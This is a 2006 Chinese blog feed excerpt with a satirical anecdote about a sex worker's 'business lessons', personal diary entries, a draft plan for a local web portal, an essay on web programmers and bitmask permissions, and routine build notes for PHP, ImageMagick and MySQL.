“千万不能傻站在一个地方等客人。而是通过选择站街的地点，时间，和客人，主动地决定你要做的项目。”我非常惊讶，这听上去很有意思。“有人说做小姐是靠运气吃饭的职业。我以为不是。你要站在客人的位置上，从客户人的角度去思考。”这句话听上去很专业，有点象很多商业管理培训老师说的“put yourself into others&#39; shoes.”
“给你举个例子，医院门口，一个拿着药的，一个拿着脸盆的，你接哪一个。”我想了想，说不知道。
“你要接那个拿脸盆的。一般人病小痛的到医院看一看，拿点药，不一定会想怎么放纵，说不定生着病连女人都不想。拿着脸盆叫小姐的，那是出院的。住院哪有不死人的？今天二楼的谁死了，明天三楼又死了一个。从医院出来的人通常会有一种重获新生的感觉，重新认识生命的意义，生命苦短，及时行乐才最重要。那天这个说：操，去宾馆开房，给你2000包夜，你穿护士服，让我出了对那些狗日的护士的一口恶气。伸手给了我2000，眼睛都不眨一下。你说他会做个按摩，然后做推油吗？绝对不会！”
我不由得开始佩服。
“再给你举个例子。那天在潘家园，三个人对我招手。一个年轻男人，从商场出来，手里拿着礼品盒。还有一对老男人西装革履，红光满面的，一看就是刚喝完酒的。第三个是个里面穿绒衬衫的，外面羽绒服的男子，背着笔记本包拖着拉杆箱。我看一个人只要3秒钟。我毫不犹豫地停在这个男子面前。这个男的跟我开房后说：沙漠风暴，水晶之恋~~~还没说后面就忍不住问，为什么你毫不犹豫地跟我走了？前面还有两个人，你要是跟他们走，我也不好意思和他们抢。我回答说，那个小p孩拿着礼品盒，是晚上要去跟女朋友约会的，肯定不会包夜；那两老男人刚喝完酒，做完就睡，也不会包夜，而且喝完就一次就做特长时间；你是来出差的，拿着笔记本包和拉杆箱，一看就是能报销。而且一个人住宾馆，估计是包夜。那个男的就说，你说对了，包夜。”
“那些在发廊门口，穿着裤衩背心的人可能是有钱的主吗？可能去宾馆开房包夜吗？高级点的宾馆也不会让他进啊。”
有道理！我越听越有意思。
“很多小姐都抱怨，生意不好做啊，最近又严打了啊，都从别人身上找原因。我说，你永远从别人身上找原因，你永远不能提高。从自己身上找找看，问题出在哪里。”这话听起来好熟，好像是“如果你不能改变世界，就改变你自己”，或者Steven Corvey的“影响圈和关注圈”的翻版。“有一次，在动物园一个人叫我，做推油。后来又有一次，一个人在动物园叫我，还是做推油。我就问了，怎么你们在动物园这找小姐的人，很多都是做推油呢？人家说，在动物园有一个公交车枢纽，我们都是在这里等车没事干，顺便做个推油的。我恍然大悟。比如你动物园那一块，没有写字楼，没有酒店，什么都没有，只有公共汽车站，在这里找小姐的多半都是刚下公共汽车的，再换另一趟车回家的。在这里找小姐的客人通常都是速战速决推个油。”
“所以我说，态度决定一切！”我听十几个总裁讲过这句话，第一次听小姐这么说。
“要用科学的方法，统计学来做生意。天天等在三里屯排队，怎么能赚到钱？每个月就赚5000块钱怎么买得起化妆品好衣服打扮自己？这就是在谋杀啊！慢性谋杀你的青春。要用知识武装自己。学习知识可以把一个人变成聪明的人，一个聪明的人学习知识可以变成很聪明的人。一个很聪明的人学习知识，可以变成天才。”
“有一次一个人去我家，问做什么。他说做按摩加胸推。我说不爽，直接xx吧。他说，这多贵啊。我说，没关系，你经常出来玩你有经验，你做胸推200块，你按我说的，你只给200快就好了，多的算我的。最后，按我的做了，多做了一些服务，xx可比胸推快多了，按摩加胸推一耽误就是半天没法做别人的生意，xx10分钟搞定。我只收了200块。客人很高兴，省了100元钱左右。这对我来说就是闭上眼睛躺一会。我相当于躺一会患了半天的时候。我刚才说了，我一天的成本272.7块，我多合算啊！”
“在北京，不算高级夜总会里做的，一般一个小姐7、8千，拿回家。做的好的大概2万左右。顶级的小姐大概每月能有5万。全北京10万个小姐，大概只有2-3个小姐，万里挑一，每月能拿到8万以上。我就是这2-3个人中间的一个。而且很稳定，基本不会大的波动。”
太强了！到此为止，我越来越佩服这个小姐。
“我常常说我是一个快乐的鸡。有人说，你是因为赚的钱多，所以当然快乐。我对他们说，你们正好错了。是因为我有快乐、积极的心态，所以赚的钱多。”
说的多好啊！
“要懂得体味工作带给你的美。大冬天的在三里屯站街，很多小姐抱怨，这[骂人可耻]破天！真是倒霉。千万不要这样，用心体会一下这个城市的美，身边有很多同性恋帅哥经过，非常现代的高楼大厦，虽然买不起，但是却可以用欣赏的眼光去享受。开公园打野炮，看着草地的绿色，冬天是白色的，多美啊。再看看钱包，1000 多了，就更美了！每一样工作都有她美丽的地方，我们要懂得从工作中体会这种美丽。”
“我5年前是天上人间的领班。3年前在作三个不同桑拿做过头牌。后来我不干了，一个月就3、5万块，没意思。就主动来做站街。我愿意做一个快乐的野鸡。哈哈哈哈。”
到了机场，我给她留了一张名片，说：“你有没有兴趣这个星期五，到我办公室，给微软的员工讲一讲你怎么当小姐的？你就当在床上，一个全套一小时，你讲多久，我就付你多少钱。给我电话。”
我迫不及待的在小姐家的卫生间里记录下他这堂生动的MBA课。</description>
    </item>
    
    <item>
      <title>今天终天知道了</title>
      <link>http://example.org/2006/07/19/e4bb8ae5a4a9e7bb88e5a4a9e79fa5e98193e4ba86/</link>
      <pubDate>Wed, 19 Jul 2006 09:40:25 +0000</pubDate>
      
      <guid>http://example.org/2006/07/19/e4bb8ae5a4a9e7bb88e5a4a9e79fa5e98193e4ba86/</guid>
      <description>玩了两天了，今天把我给分了，应该是公共项目组呵呵，先给三石搞相册，先看代码，然后跟他学类吧，其实有些类我觉得真的没必要，用它有什么用呢，也许是一个人一个想法吧，人都来了，就学着这里的方法做吧，其实三石写代码还是不错的，不过如果你要是不认识他见了他看他应该像个老析，七夜老叫他三胖子，还没有我想像中的那么胖呵呵！
唉，还是先看什么静太类，模块替换吧！</description>
    </item>
    
    <item>
      <title>回到北京．来到网友！</title>
      <link>http://example.org/2006/07/17/e59b9ee588b0e58c97e4baacefbc8ee69da5e588b0e7bd91e58f8befbc81/</link>
      <pubDate>Mon, 17 Jul 2006 10:38:12 +0000</pubDate>
      
      <guid>http://example.org/2006/07/17/e59b9ee588b0e58c97e4baacefbc8ee69da5e588b0e7bd91e58f8befbc81/</guid>
      <description>拿着那么多书，又来到北京好累呀，昨天是小宝宝
唉，可到最后确弄成这样，其家大家在一块很开心，弄成这样何必呢！
第一天网友上班，早上地铁人多的受不了，上了一天班，玩了一天，不知明天会怎么样呀！</description>
    </item>
    
    <item>
      <title>昨天来到石家庄</title>
      <link>http://example.org/2006/07/11/e698a8e5a4a9e69da5e588b0e79fb3e5aeb6e5ba84/</link>
      <pubDate>Tue, 11 Jul 2006 04:38:33 +0000</pubDate>
      
      <guid>http://example.org/2006/07/11/e698a8e5a4a9e69da5e588b0e79fb3e5aeb6e5ba84/</guid>
      <description>想想那次来来北京还是4个前的时候了，不过在北京也就是那样，回到石家庄更伤心，
不过这次做火车比以前快了，记得上次到北就是差点4个小时呢，这次只用了三个小时，
回到石家庄，感觉这个地方还是那样，什么都没变，最郁闷的是，在车站打车等了半天，
还什么5人人不拉，唉，过两天又要回到北京，不过希望这次有个新的开始！</description>
    </item>
    
    <item>
      <title>所谓的男人</title>
      <link>http://example.org/2006/07/07/e68980e8b093e79a84e794b7e4baba/</link>
      <pubDate>Fri, 07 Jul 2006 07:35:40 +0000</pubDate>
      
      <guid>http://example.org/2006/07/07/e68980e8b093e79a84e794b7e4baba/</guid>
      <description>男人这辈子挺难的：找个漂亮女人吧，太操心，找个不漂亮的吧，又不甘心；光顾事业了，人家说你没责任感，光顾家了，人家又说你没本事；专一点吧，人家说你不成熟；花心点吧，人家说你是禽兽；有钱，说你是坏人，没有钱，人家骂你窝囊废；自己奋斗吧，等有钱了女友也老了，让女人养吧，不如自宫练葵花宝典算了。不去应酬，怕被老板废了，去应酬吧，怕被老婆废了。哎！这年月做男人真难。女人可以等嫁，俺们等啥呀？女人还有个三八节，俺们有啥呀？ 男人这辈子真的挺难的：长帅点吧，太抢手，不帅吧，拿不出手；活泼点吧，说你太油，不出声吧，说你太闷；穿西装吧，说你太严肃，穿随便一点吧，说你乡吧佬；会挣钱吧，怕你包二奶；不挣钱吧，又怕孩子断奶，结婚吧，怕自己后悔；不结婚吧，怕她后悔，要个孩子吧，怕出来没钱养，不要孩子吧，怕老了没人养。这年头做女人难，做男人更难，男人，就要对自己好点！</description>
    </item>
    
    <item>
      <title>地方信息站建立可行方案放了失败了,大家喜欢就拿去吧</title>
      <link>http://example.org/2006/07/04/e59cb0e696b9e4bfa1e681afe7ab99e5bbbae7ab8be58fafe8a18ce696b9e6a188e694bee4ba86e5a4b1e8b4a5e4ba86e5a4a7e5aeb6e5969ce6aca2e5b0b1e68bbfe/</link>
      <pubDate>Tue, 04 Jul 2006 14:36:48 +0000</pubDate>
      
      <guid>http://example.org/2006/07/04/e59cb0e696b9e4bfa1e681afe7ab99e5bbbae7ab8be58fafe8a18ce696b9e6a188e694bee4ba86e5a4b1e8b4a5e4ba86e5a4a7e5aeb6e5969ce6aca2e5b0b1e68bbfe/</guid>
      <description>原来我们搞网站的就这么渺小,只是自己的理想被放大了而已,在中国这个政治,这个环境,这种腐败的压力下不得不低下自己高贵的头&amp;hellip;.. 广播局局长还是我爷爹也帮不了我资金,政策上的问题,原本以为我可以为我们家乡尽自己的一分力,我真的是有心无力了,这里祝各位在地方信息站上挣扎发展的兄弟门都有所做为,创出自己的天地&amp;hellip;&amp;hellip;
下面只是自己给爷爹看的初稿,因为无法实施给大家一个参考文献吧,很烂,喜欢就支持下,不喜欢希望别骂,自己写的,心情不好,很烦
一． 互联网市场状况及成长 随着互联网的高速发展，越来越多的人加入了网民的行列。最新统计数字显示在中国，已经有超过1亿的网民享受着互联网带来的服务。分析现行的“门户”网站，其对网民的服务定位到：新闻资讯，在线影音服务，在线交流服务，网络游戏服务等。极少内容对生存在现实生活中的网民起到实质性的利益。另一方面，这些内容体积庞大的门户网站，其电子商务等多领域在对应诸多专业网站时拙形渐现。分析原因，主要是其服务与其优势栏目未能互补，娱乐服务与商务服务比重失调。Internet的出现，其意义绝不仅是让网民更好的娱乐，网民更看中的是所能带来的实质性利益。 我们计划创建中的地方性综合门户网站，它是一个集场所信息服务和网络应用服务于一体的站点，是以各区为单位的综合门户网站组合起来为基础的。与目前现有的所谓门户站点从网站构架内容上所不同的是，我们不仅向各类网民提供便于生产生活学习等方面的权威及时资讯服务，更重要的是我们通过各个互动的商务、娱乐频道，将网站单一的灌输使网民被动接受变为通过各类型的网民的参与使网站PV值增大，这个进步就如windows操作系统相对于Dos系统界面的进步；在市场运作方面，我们依托本地服务，以扎实求稳、诚心服务为基础，向企业、个人用户提供更优质的服务，结束一个地区内市场混乱无从选择的局面。 二． 建站前应明确的问题
明确网站定位 区域门户网站(地方性便民信息交流网站)。成为为地方网络用户提供地方咨询、娱乐.学习,电子商务等的综合信息港，相对于其它单一网站，本站内容更全面,更有地方特性,更具吸引力。 建站的目标 近期目标：能够xx85%的互联网用户所认识并时常浏览,增加xx网民对网站的粘度,拥有一批固定的访问群. 远期目标：成为xx人民互相交流，了解各种咨询信息,购物等的通道,充分体现地方性便民的理念和服务平台。 网站的目标用户 网站访客的主要群体：xx本地居民、企业、在外xx网民及广大潜力存在人群 网站基本栏目 包括：企业黄页，网上商城，人才市场，房产交易，二手市场，娱乐信息(娱乐新闻,笑话,电脑等)，在线影院，消费打折，留言反馈，分类广告，地方信息咨询，真情交友，电子相册，博客，社区。 三． 建站方案 四． 网站可行性分析 1． 网站想让访客得到什么? 不同的目标用户想得到的服务或内容不同。有些站长，在做地方性门户的时候，只追求大而全，仿照各大门户做，从首页看，好像整个网站有非常多的内容，其实里面有价值的东西，少之又少,从而背离了建站的初衷。有些站长干脆用个小偷建站(所谓小偷即是全站都为他人网站内容)，地方门户应该以地方的信息资源为中心，为网民提供对他们有用的信息，比如地方信息咨询，房产，人才，出租信息,地方企业等等。在网站上，用户希望能够随心所欲的浏览自己需要的信息，有的用户不光想看，还想自己动手参与一些活动。比如论坛,交友,买房,有奖竞猜。 2． 网站上有什么会使得访客逗留? 有什么东西会使得访客再次来? 如何拥有稳定的用户群？ 漂亮的界面是别人对网站有个好的第一印象的关键，十分重要，而对于门户网站，内容则是重中之重，站在网民角度去想，有用、鲜活的信息和服务才是根本。作为区域门户，提供更多、更及时、更丰富的本地化内容是突显其特点和定位的关键，所以，内容，还是本地化内容是重中之重。内容要经常更新、内容要本地化。本地化、丰富、鲜活的内容，这可能是其他全国知名网站也无法跟我们竞争的关键。网络上获取信息十分容易，而我们的网站因本地化内容而独特，从而更能吸引目标用户。 网站如果仅仅提供给访客枯燥无味的文字信息，是没有吸引力的。这就需要与商家以及我们生活环境紧密联系，与周边服务紧密结合，所谓的在线服务，其实是信息服务，信息本身不是价值，产品才是价值，而产品在本地，在周围的市场里，超市里，地摊上（土特产），甚至在大家的手里（二手交易信息发布）。抓住地方特色的新闻才是最重要的，绝大多数网民很关心我们xx本地的发展，及动态，多多收集一些地方的新闻，会使本站人气旺起来。可以和地方报社等媒体合作，相信在网上给他们免费宣传，他们会非常乐意。 3．论坛是大家抒发情感的地方，针对xx的网民，开设具有我们xx特色的版块，可以时不时举办一些坛友聚会，以凝聚论坛的人气。 A． 互动/有奖活动的组织. 持续搞一些“有趣的有奖小调查、小测试”，请企业冠名赞助小奖品（奖品不必贵重，只要对访客有用就行），访客就会常来看结果，还介绍朋友来。 所以，互动的内容必须先做出个样子，即使是“虚假繁荣”，对访客也会起到引导作用，从而真正繁荣起来，这之后，访客就成为这部分内容的更新者了 B． 搞一些网络活动. 如：XX数码相机杯“宝宝秀”网络大赛 XX杯“城市形象小姐”网上投票 XX杯“城市美眉”网上投票 XX杯“网页制作”比赛 XX杯“网络知识”比赛等等 明确客户群的需要 3．可以请电信局的网管在装宽带的时候把本网站作为用户的开机首页，至少也放一个图标在桌面上，这样更多的用户能浏览本站。 五． 网站宣传（广告策略）
面向居民 A． 广播局官方宣传。 现阶段的中国，传统媒体宣传的影响力仍然大于网络，特别是对于面向市县内的站点，电视、报纸、杂志等这些媒体的效应可以说是立竿见影，通过吸引媒体，特别是传统媒体的注意力达到宣传的作用。 B． 利用网吧推荐，形成更强劲的认知推广趋势力。 C． 商家的促销活动。 D． 利用网站首页的网吧推荐栏目和广告位，取得网吧支持，让网吧机器上设本网站为首页，利用网吧作为宣传窗口。与网吧合作，给他们一些广告支持，让他们将本网站设为主页 E． 网民发现新网站的第三大方式——朋友介绍。 面向企业 A． 广播局官方宣传。 B． 给企业提供一个发布最新咨询的平台，让网站上的访客能在第一时间内了解企业的最新动向。 C． 加强企业之间的交流与合作 3． 网站策划建设阶段的推广：也就是从网站正式发布前就开始了推广的准备，在网站建设过程中从网站结构、内容等方面对google、百度等搜索引擎进行优化设计(SEO优化技术) 4． 网站发布初期的基本推广手段：登录10个主要搜索引擎和分类目录（列出计划登录网站的名单）、与部分合作伙伴建立网站链接。另外，配合公司其他营销活动，在部分媒体和行业网站发布企业新闻。 5． 网站稳定期的推广：结合公司新产品促销，不定期发送在线优惠卷；参与行业内的排行评比等活动，以期获得新闻价值；在条件成熟的情况下，建设一个中立的与企业核心产品相关的行业信息类网站来进行辅助推广。 6． 推广效果的评价：对主要网站推广措施的效果进行跟踪，定期进行网站流量统计分析，必要时与专业网络顾问机构合作进行网络营销诊断，改进或者取消效果不佳的推广手段，在效果明显的推广策略方面加大投入比重。 六． 市场潜力分析 1． 浏览用户群体 报告显示，我国上网用户总数为9400万，预计互动网络至2007年用户数量1000万，其中32%为商业用户（企业电子商务服务），68%为个人网用户(网上购物、交友娱乐、影视音乐、生活资讯等)。网站的运作是否成功，是依赖于是否得到了强大的浏览用户群体支持。（市场调查） 到目前为止，xx并没有一个综合且调动大众积极性，便于网民交流与查找xx本地咨讯的官方网站。对于网民来说，方便且实用是他们最大的需求。本站正是基于这样一个相对&amp;quot;忠实&amp;quot;的局域网用户群体建立起来的，由于其区域性、指向性强的特点，将更有利于其吸纳这样的网络用户群体。这群用户对运用网络充满热情，具有无限的市场潜力。 2． 网络资源运用不足 根据调查分析，访客浏览网页的主要目的是为了解各种资讯、在线聊天和收发电子邮件，但是阻止他们或潜在阻止他们上网的原因则有两个：INTERNET浏览速度太慢，全国性的网站缺少符合本地要求的个性化服务。正是这两个原因，造成了xx这种虽有得天独厚的网络资源而没有真正为广大本地网络用户带来更多的实惠，网络资源的运用存在较大的空白。所以地方性的综合咨询站具有很大的市场潜力。 3．竞争对手 七． 风险应变策略 1． 外部风险应变策略 政策环境的变化 经济环境的变化 法律环境的变化 人文/风俗的抵触 科技的发展/专利与知识产权的保护 2． 内部风险应变策略 资金的问题 市场的问题 管理的问题 公关的问题 人员的问题 3） 网站运营、管理、会员开发和广告经营不力，网站始终没有盈利点，无法进入良性的循环； 八． 投资与回报 任何投资活动的目标都是寻求未来的发展，投资机会决定投资环境的未来变化。如果企业投资到一个已经成熟的市场，或者说群雄争霸的市场，可以说，企业投资的风险相对小一些，但发展起来会有不少困难，尤其是想在市场上占有一席之地，会有不小的竞争。反过来说，企业如果投资到一个充满发展机会却又暂时没有头绪的市场，发展的机遇、盈利的机会相对较大，但风险也随之增大，即所谓风险是伴随着机会永远存在的。因此，企业所寻求的应该是寻找机会且又规避风险的投资。 对于互动网络而言，正是基于该投资主体的特殊性，才使得投资者拥有了一个前所未有的投资环境。现如今，网络的发展已经明显由多体向单体的方式转化，这种趋势只能说明了网络必然会更进一步的走向商业化。由此而引发的竞争将会使网络产生划时代的变革。设想未来的网络，必将是充分的互动和虚拟化，而正是这种特性决定了竞争的空前激烈和单体的不断涌现。因此，今后网络上的竞争已不仅只是技术，更需要注重市场，随着单体的存在，最终落实于智慧。这正象我们始终崇尚的理念 “网络还智慧于本源”。 对于投资者而言，投资者所关心的是如何才能规避投资所带来的风险。互动网络是一个极具严密性的完整体系，他所体现的先进理念是互联网时代决无仅有的，从而也使投资风险降到了最低。因此，当我们按不同的阶段、不同的策略，逐渐推出战略重点时，我们很容易看出：当年投资，当年即可见收入，第二年便可回收资金。 九． 结论 综上所述，互动网络这一项目不但在市场理念、资本运营手段上具有超前性，而且具有很高的投资的回率。 这是一个充满机遇和挑战的时代，世界首富比尔?</description>
    </item>
    
    <item>
      <title>php 编译支持ImageMagick</title>
      <link>http://example.org/2006/06/25/php-e7bc96e8af91e694afe68c81imagemagick/</link>
      <pubDate>Sun, 25 Jun 2006 11:21:11 +0000</pubDate>
      
      <guid>http://example.org/2006/06/25/php-e7bc96e8af91e694afe68c81imagemagick/</guid>
      <description>首先你要先成功的编译一次php
在phpbin目录中会产生 phpize 这个文件，是待会咱们要使用到的。
按照网上说的方法，试验了N遍总是失败。
总是提示：
Cannot find config.m4.
Make sure that you run &amp;lsquo;/usr/local/php/bin/phpize&amp;rsquo; in the top level source directory of the module
无奈，去 官方网站
然后进入 program interface 的链接
找到php的部分，点击进入，下载了 magickwand-0.1.8.tar.bz2
然后再次按照网上的方法
解压缩到php源代码目录的ext目录下
然后cd进去
/usr/local/php/bin/phpize
成功了。。。
然后cd到php源代码目录，也就是 cd ../../
rm -rf ./configure
再执行： ./buildconf &amp;ndash;force
rebuild的时候可能会出现
autoheader: WARNING: Using auxiliary files such as acconfig.h&#39;, config.h.bot&amp;rsquo;
autoheader: WARNING: and config.h.top&#39;, to define templates for config.h.in&#39;
autoheader: WARNING: is deprecated and discouraged.</description>
    </item>
    
    <item>
      <title>mysql 编译时增加字符集的配置</title>
      <link>http://example.org/2006/06/25/mysql-e7bc96e8af91e697b6e5a29ee58aa0e5ad97e7aca6e99b86e79a84e9858de7bdae/</link>
      <pubDate>Sun, 25 Jun 2006 03:04:35 +0000</pubDate>
      
      <guid>http://example.org/2006/06/25/mysql-e7bc96e8af91e697b6e5a29ee58aa0e5ad97e7aca6e99b86e79a84e9858de7bdae/</guid>
      <description>如果你在你的my.cnf文件中增加了 default-character-set = gbk 但是当你无法启动mysql，错误日志里面报告类似于这样的： 060625 01:37:00 mysqld started
^G/usr/local/mysql/libexec/mysqld: File &amp;lsquo;/usr/local/mysql/share/mysql/charsets/gb2312.conf&amp;rsquo; not found (Errcode: 2)
^G/usr/local/mysql/libexec/mysqld: Character set &amp;lsquo;gb2312′ is not a compiled character set and is not specified in the &amp;lsquo;/usr/local/mysql/share/mysql/charsets/Index&amp;rsquo; file
060625 01:37:00 mysqld ended 错误的时候，
目前我的解决方法是重新编译mysql，在编译的参数中加入&amp;ndash;with-extra-charsets=gbk,gb2312 便可解决此问题。
解决方法参考： MYSQL完全安装使用指南
下面付上原文
[quote]
mysql安装笔记
cloud/2003.10.10
mail:flashc@21cn.com
欢迎转载，转载请保留上述信息，谢谢
学习了很长时间的linux，有必要做一下整理笔记了，以下是mysql的安装笔记,和常见的一些使用方法。
因我喜欢调试优化系统,所以在编译安装时使用了一些选项增加编程后程序的执行效率,有些可能我理解有错,希望大家指出.
●安装mysql
tar zxvf mysql-4.0.14.tar.gz -C /setup cd /setup/mysql-4.0.14 groupadd mysql useradd mysql -g mysql -M -s /bin/false ./configure &amp;ndash;prefix=/web/mysql 指定安装目录 --without-debug 去除debug模式 --with-extra-charsets=gb2312 添加gb2312中文字符支持 --enable-assembler 使用一些字符函数的汇编版本 --without-isam 去掉isam表类型支持 现在很少用了 isam表是一种依赖平台的表 --without-innodb 去掉innodb表支持 innodb是一种支持事务处理的表,适合企业级应用 --with-pthread 强制使用pthread库(posix线程库) --enable-thread-safe-client 以线程方式编译客户端 --with-client-ldflags=-all-static --with-mysqld-ldflags=-all-static 以纯静态方式编译服务端和客户端 --with-raid 激活raid支持 make make install scripts/mysql_install_db 生成mysql用户数据库和表文件 cp support-files/my-medium.</description>
    </item>
    
    <item>
      <title>NP写给互联网上从业的Web程序员</title>
      <link>http://example.org/2006/06/18/npe58699e7bb99e4ba92e88194e7bd91e4b88ae4bb8ee4b89ae79a84webe7a88be5ba8fe59198/</link>
      <pubDate>Sun, 18 Jun 2006 12:07:06 +0000</pubDate>
      
      <guid>http://example.org/2006/06/18/npe58699e7bb99e4ba92e88194e7bd91e4b88ae4bb8ee4b89ae79a84webe7a88be5ba8fe59198/</guid>
      <description>程序员是一个脆弱、特殊的群体，以各种方式生存在有01的世界里。
程序员的特点： 狂躁，但是有修养 随和，但是疯癫 肯向任何人学，但是不服任何人 守约，但是不守时 感情丰富，但是单纯 …… Web程序是程序员中的一个别具特色的群体，他们有着和HTTP协议类似的无状态性、无序性、不可预测性。我这么说，是因为web程序员的出身、成分、学习途径、从业历程多种多样。Web程序员，是现今IT从业者中最具活力也最复杂的最可爱的一群人。
相比于传统的“学院派”程序员（请暂时允许我这么说），Web程序员的普遍出身都比较“贫寒”，这是行业事实，尤其是处于刚入行不久的这一大部分人中，有很多是没有上过大学，受过正常高校教育体制折磨的。高中、专科甚至初中学历的程序员比比皆是，他们通过自己的努力，掌握了一定的技能，取得了一项不错的工作。
“学院派”包括很多集团性质的大规模开发活动，外包项目，基于底层或硬件的开发，研究性的开发等等，体现在开发工具上多集中于C、C++、Ada等学院气息浓厚的语言，Java在某种程度上也可以算作其中，他们的特点是基础牢固、严谨、重视内在，又有些枯燥的味道。Web开发更倾向与灵活、开发效率和表现形式。
然而由于各种原因，很多高等学府中的学生有一种很不正确的误解，认为Web开发是低于传统开发的，没有水平的，浮躁的，实在没工作的表现，从而看不起它。相对的，很多Web从业者认为大学生毕业后去的大公司的工作是死板的，缺乏创造性的，枯燥的，没有真才实学的，更认为大学里学不到什么，从而也看不起，甚至仇视大学教育（包括一些受过高等教育的人）。这是一个非常现实的矛盾。
当然这个矛盾只是集中没有毕业的学生和从业时间不长的人群中，等到工作一段时间之后，相互接触得多了，都会觉得自己原本并没有体验到对方的真实内涵。传统开发中有很多富有创造性富有激情的内容值得互联网行业借鉴，而Web开发中千奇百怪的想法和时刻面对亿万用户的几乎无法预测的使用环境都是传统开发者觉得羡慕不已的，而两者结合更是体现了学院的严谨、知识的重要、来自用户的成败决定性，比如搜索引擎，比如企业级的B/S分布系统。
一个精熟C语言并有着丰富经验的人，转行从事Web开发是比较快的，甚至可以说是如鱼得水，但是一个做了两年PHP而又没有什么其它的语言背景的程序员，在自身发展上就会受到阻碍了。任何一门语言上升到一定高度，它所面对的问题已经不再是这门语言本身。语言只是工具，使用工具的方法才是生产效率的决定因素。熟习了语言之后，慢慢地在工作中会碰到诸如执行效率、存储方法、算法优化等更多偏向分析而不是代码艺术的内容。通常对于一个没有受过系统的计算机教育，没有受过自认为“没用”的大学培养的程序员，在这些问题面前表现都是比较盲目、无助的。很多问题需要严整的数学分析，查阅参考资料需要比较好的英文水平和数学基础，聪明一点的会马上意识到大学基础教育的重要性，多半都会后悔上课睡觉了，呵呵～～
一些人对于分析方法等抱着不以为然的态度，认识多是浮于表面，比如对于数据结构和算法的淡漠，觉得在Web开发中极少或不可能触及到这些内容。诚然，现在的Web开发脚本语言都有丰富的函数，灵巧的使用方式，多数已经不需要再像C语言一样声名变量、创建指针、计算内存地址、写排序算法。而且基于互联网的不可预知性，也很难有一个完美的算法解决所有情况下的问题，比如排序。程序员在这种情况下都是使用语言内置的各种功能在完成操作，当然我不是说什么都要从头开始自己写，那是莽夫做的傻事，但是我想，既然用了，多多少少也应该知道函数是怎么回事。自己写的function是函数，系统提供的就不是函数了么？不求看懂源码，至少也应该知道它是在做什么。每天追求执行效率和页面执行时间的程序员，更是忽略了系统函数本身的效率问题，把所有的系统函数都想象成了汇编中的NOOP这种单元操作。
Web开发中碰到的算法问题很少么？举一个小例子：iForum论坛（前年我在上海看过）中记载用户组权限的方法，是在数据表中插入一条类似11110010011100的字符串，每一位代表一种操作，1就是表示有权限进行操作，0就是没有。这种方式很简单实用，但是它受到Varchar的长度限制（虽然255种操作已经足够复杂了），而且字符串的计算效率又是低于数字，那么有没有想过这种算法的本质是什么呢？有没有想过优化它呢？
中国古代有一套数学理论叫做“盈不足术”，例如，有十只盒子，第一个盒子里放一个盘子，第二个盒子里放两只，第三个盒子里放四只，第四个盒子里放八只……第九个盒子里放256只，第十个盒子放512只，即第N只箱子里放2^(N-1)只盘子，一共1023只。那么命题如下：在1023这个数字之内，任何一个数目都可以由这十只盒子里的几只组合相加而成（大家自己算算就知道了……呵呵）。 那么1、2、4、8、16、32、64、128、256、512这个序列为什么有这么个魔力？这个数列的特点：1、每项是后一项的二倍，2、每项都比前面所有项的和大，而且大1。这个1就是关键，就因为这个1，它才可以按1递增，拼出总和之内任意一个整数。这个序列叫做超递增序列，它是解决背包问题的基础。 对于一个整数，假设377，它的二进制表示为“101111001”，它就是由第一只、第四只、第五只、第六只、第七只和第九只箱子拼成的，对于一个表现了9种操作的描述，377就是这个描述下的一个实例，是一个权值。 那么相比于保存这个字符串和保存这样一个数值，好处和坏处都在哪里呢～～很明显的，保存字符串的好处是运算压力小。我们可能听过一个故事，就是把这个超递增序列延伸到第64项，就是那个术士和皇帝在国际象棋棋盘上要米粒的传说。64项的和是一个天文数字！但是不要忘了，计算机本身就是一个只认识二进制的机器！（这点很多Web程序员都忽视了，很多人不知道位操作是什么玩意）有人担心数据库的int不够长，那么既然可以保存一个只有0、1组成的varchar字符串，为什么不能保存一个十六进制的字符串，有人规定varchar只能保存01吗？十六进制串的长度正好是二进制的四分之一，而十六进制到二进制的转化是非常直接方便的。 以上就是这个权限串的由来，不知道有多少web程序员想到过这些……而一个C或汇编程序员看到这个字符串第一眼就会想起这是个十进制的15516（当然不是马上就算得出来）。 由此引出的和web相关的，比如多选框的保存，投票选项的保存等等……
Web程序员需要学习一些数据结构、算法分析等知识，虽然在工作中不会使用得那么明显，但是这些概念是学习本身语言的一个很好的催化剂，它会让程序员更有效地理解资料上的信息，达到事半功倍的目的，也会在问题陷入苦处不得解脱时候帮助开发者理清头绪，以一个清晰的思维过程找到解决问题的突破点。
阻碍程序员学习这些的原因，第一就是基础学科不扎实，比如数学。计算机划分为理工科是非常有道理的，计算机科学建立在深厚庞大的数学系统之上，至于如何学数学……这是功夫问题了。第二是心理障碍，觉得离开学校就学不好。自然学校是学习基础学科的最好地方，但是往往工作上需要的知识更贴近实际，在实际中学习通常会比在枯燥的书本上搬东西效果更好。第三是客观原因：从业者多半工作都很忙，业余时间很少（这几乎是程序员的标志），那么学习只能在工作中见缝插针，这种学习方式需要会用巧功，会联系。第四个就是信息来源。现在适合Web程序员学习，根据Web脚本语言特点编写的基础类书籍太少了！比如数据结构类书籍多半是以C/C++/Pascal这类强类型的严谨的传统语言为描述基础，操作系统原理多是以汇编等底层脚本描述，设计思想多是以Java这种纯OO的语言为主，我没有发现有使用Perl这种怪异的语言教授数据结构的学校。
基于以上的研究结果，我们可以有条理地整理思路，多站在Web程序员的角度上考虑，做出一些适合这个特殊群体学习提高的有意义的活动。
（——NP博士，2006年6月12日夜）</description>
    </item>
    
    <item>
      <title>linux下的ImageMagick安装方法。</title>
      <link>http://example.org/2006/06/14/linuxe4b88be79a84imagemagicke5ae89e8a385e696b9e6b395e38082/</link>
      <pubDate>Wed, 14 Jun 2006 17:54:58 +0000</pubDate>
      
      <guid>http://example.org/2006/06/14/linuxe4b88be79a84imagemagicke5ae89e8a385e696b9e6b395e38082/</guid>
      <description>linux下的ImageMagick安装方法。
首先从网上下载 ImageMagick
官方网址是： www.imagemagick.org
从官方不好下载，提供 sourceforge的下载地址： imagemagick.sourceforge.net
然后下载下来解压缩，
./configure &amp;ndash;prefix=/usr/local/imagemagick &amp;ndash;enable-lzw &amp;ndash;with-modules &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make install
基本上这样就可以了。
默认的就支持jpeg，png等图片
你也可以加入&amp;ndash;without-xxx来禁止一些选项，具体的就 ./configure &amp;ndash;help | grep without吧。
ok编译好了，需要的时间漫长的。
然后就可以测试了。
/usr/local/imagemagick/bin/convert -quality 90 -resize 100×100 /tmp/origine_image.jpg /tmp/small_100_100.jpg
